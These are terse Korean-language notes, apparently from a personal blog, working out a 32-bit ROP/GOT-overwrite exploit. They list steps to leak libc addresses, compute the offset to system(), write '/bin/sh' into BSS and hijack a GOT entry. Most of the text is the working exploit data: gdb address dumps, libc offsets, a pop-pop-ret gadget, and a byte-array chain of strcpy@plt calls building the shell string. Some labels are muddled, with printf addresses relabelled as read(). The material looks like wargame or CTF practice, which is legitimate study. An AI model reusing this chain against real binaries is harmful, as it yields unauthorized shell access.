https://d4m0n.tistory.com/84
exploit 과정 
1. write함수로 read()함수의 실제주소 얻기
2. read()함수 - system함수의 offset ㅇ녀산 -> system 함수의 실제 주소 얻기
3. read()함수로 BSS 영역에 "/bin/sh" 문자열 저장
4. read()함수로 write함수의 GOT에 system()함수의 실제 주소 저장
5. BSS영역의 주소를 인자로, write함수의 PLT를 호출하여 실질적으로 system함수 호출  

 0x080485cd <+130>:	call   0x80483c0 <printf@plt>
				printf@got 0x804a00c

-> strcpy@plt 사용하여 

p printf
 $1 = {<text variable, no debug info>} 0xb7d8d680 <__printf>
 p system
 $2 = {<text variable, no debug info>} 0xb7d7edb0 <__libc_system> + 0xE8D0
p execve
$3 = {<text variable, no debug info>}  0xb7df48c0 <execve>			- 0x67240
$7 = {<text variable, no debug info>} 0xb7d8e9e0 <__GI_exit>	

<strcpy@plt> : 0x80483e0       - 0xe0,0x83,0x04,0x08,
<puts@plt> 	 : 0x80483f0       - 0xf0,0x83,0x04,0x08,
<puts@got> 	 : 0x804a018       - 0x18,0xa0,0x04,0x08,

printf@plt 		= 0x80483c0 
printf@got 		= 0x804a00c

read() => (printf)
strcpy의 plt 	= 0x080483e0	 0xe0,0x83,0x04,0x08,
read()의 plt 	= 0x80483c0
read()의 GOT 	= 0x804a00c

printf-system 	= 0xe8d0
execve-printf 	= 0x67240
printf-exit 	= 0x1aca0
setuid-printf	= 0x67d40

BSS 			= 0x0804a034
PPR				= 0x080486ca 	0xca,0x86,0x04,0x08

strcpy PLT   		 gadget
0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 
strcpy@plt + PPR + BSS[0] + "/ 주소",
{
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x44,0xa0,0x04,0x08, 0x54,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x45,0xa0,0x04,0x08, 0x57,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x46,0xa0,0x04,0x08, 0x56,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x47,0xa0,0x04,0x08, 0x5e,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x48,0xa0,0x04,0x08, 0x54,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x49,0xa0,0x04,0x08, 0x62,0x81,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x4a,0xa0,0x04,0x08, 0xd8,0x80,0x04,0x8,
   0xe0,0x83,0x04,0x08, 0xca,0x86,0x04,0x08, 0x4b,0xa0,0x04,0x08, 0x07,0x80,0x04,0x8,
}